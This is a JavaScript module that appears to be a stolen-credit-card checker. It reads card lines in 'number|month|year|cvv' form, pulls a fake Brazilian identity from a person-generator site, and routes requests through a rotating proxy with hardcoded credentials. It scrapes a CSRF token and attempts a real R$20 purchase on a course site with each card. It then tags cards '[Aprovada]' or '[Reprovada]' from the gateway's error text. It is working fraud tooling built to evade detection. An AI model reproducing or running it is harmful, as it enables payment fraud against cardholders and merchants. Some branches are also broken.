import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import randomUseragent from 'random-useragent';
import cheerio from 'cheerio'

const proxyConfig = {
    protocol: 'http',
    host: 'rp.proxyscrape.com',
    port: 6060,
    auth: {
        username: 'jpn645m14q0pkq9-country-br',
        password: '1witm204vszvwdv'
    }
};
const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);

// Função para gerar pessoa aleatória
async function generateRandomPerson() {
    try {
        const response = await axios.post(
            'https://www.4devs.com.br/ferramentas_online.php',
            new URLSearchParams({
                'acao': 'gerar_pessoa',
                'sexo': 'I',
                'pontuacao': 'S',
                'idade': '0',
                'cep_estado': '',
                'txt_qtde': '1',
                'cep_cidade': ''
            }),
            {
                headers: {
                    'Host': 'www.4devs.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'sec-ch-ua-mobile': '?0',
                    'accept': '*/*',
                    'origin': 'https://www.4devs.com.br',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.4devs.com.br/gerador_de_pessoas',
                    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }
            }
        );
        return response.data[0];
    } catch (error) {
        console.error('Erro ao gerar pessoa:', error.response?.data || error.message);
        return null;
    }
}

// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {

    try {
        console.log(numberGG,monthGG,yearGG,cvvGG)
        const randomPerson = await generateRandomPerson();
        if (!randomPerson) throw new Error('Falha ao gerar pessoa.');

        const cpfFormatted = randomPerson.cpf.replace(/\D/g, '');
        const userAgent = randomUseragent.getRandom();

        let cepSemTraco = randomPerson.cep.replace(/-/g, '');
        //console.log(`Tempo de requisição: ${durationInSeconds.toFixed(2)} segundos`);

        const response = await axios.get('https://app.t2.com.br/courseOffers/131', {
            headers: {
                'Host': 'app.t2.com.br',
                'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://t2.com.br/',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
            },
            httpsAgent: proxyAgent
        });

        const html = response.data;
        const $ = cheerio.load(html);
        const csrfToken = $('meta[name="csrf-token"]').attr('content');
        //  console.log(csrfToken);

        if (!csrfToken) {
            return console.log('request off -1')
        }

        //   console.log(yearGG)

        const purchaseResponse = await axios.post(
            'https://cursos.t2.com.br/api/v1/payments',
            {
                'installment_count': 1,
                'billing_type': 'CREDIT_CARD',
                'customer_data': {
                    'cpf_cnpj': cpfFormatted,
                    'address_number': '34',
                    'postal_code': '09890300',
                    'street': 'Rua Doutor Cincinato Braga',
                    'neighborhood': 'Planalto',
                    'state_id': 1,
                    'city_id': 80,
                    'name': randomPerson.nome,
                    'email': randomPerson.email,
                    'phone': '91984155843',
                    'phone_country_code_id': 31
                },
                'credit_card': {
                    'number': numberGG,
                    'holder_name': randomPerson.nome,
                    'cvv': cvvGG,
                    'expiry_month': monthGG,
                    'expiry_year': `20${yearGG}`
                },
                'course_offer_id': 131
            },
            {
                headers: {
                    'Host': 'cursos.t2.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'X-CSRF-Token': csrfToken,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'Accept': 'application/json',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-mobile': '?0',
                    'Origin': 'https://app.t2.com.br',
                    'Sec-Fetch-Site': 'same-site',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://app.t2.com.br/',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                },
                httpsAgent: proxyAgent
            }
        );


        // console.log()

        if (purchaseResponse.data.data.status == 'paid') {
            `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 000|Pagamento Realizado R$20,00 💸 |  [@loficenter] `;
        }

    } catch (error) {
         console.log(error.responses)
        if (!error.response) {
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - Número do cartão inválido - [@loficenter]`
        }
        let responseError = error.response.data.errors[0];

        if (responseError.includes('Código de segurança inválido')) {
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1045|${responseError} | [@loficenter] `;
        }
        else if (responseError.includes('Saldo insuficiente')) {
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 000|Pagamento Realizado R$20,00 💸| [@loficenter]`;
        } else if (responseError.includes('Pedimos desculpas pela inconveniência')) {
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 000|Pagamento Realizado R$20,00 💸| [@loficenter]`;
        } else if (responseError.includes('Transação não autorizada por violação de segurança')) {
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1022|Transação não autorizada por violação de segurança 💸| [@loficenter]`;
        } else if (responseError.includes('aprovada')) {
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno -000|Pagamento Realizado R$20,00 💸 | [@loficenter]`;
        } else if (responseError.includes('Número do cartão inválido')) {
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido | [@loficenter]`;
        } else {
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} - [@loficenter]`;
        }
    }
}

async function executeFlow(value) {
    try {

        // const uniqueList = [...new Set(list)];

        //   for (let value of uniqueList) {

        const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
        const yearSplited = yearGG.split('20')[1];
        // console.log(numberGG,monthGG,yearSplited,cvvGG)

        try {
             let respoonse =  await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
            return respoonse
        } catch (purchaseError) {
            console.error('Erro ao realizar a compra:', purchaseError.message);
        }

        //  }

    } catch (error) {
        console.error('Erro no fluxo principal:', error.message);
    }
}

export default executeFlow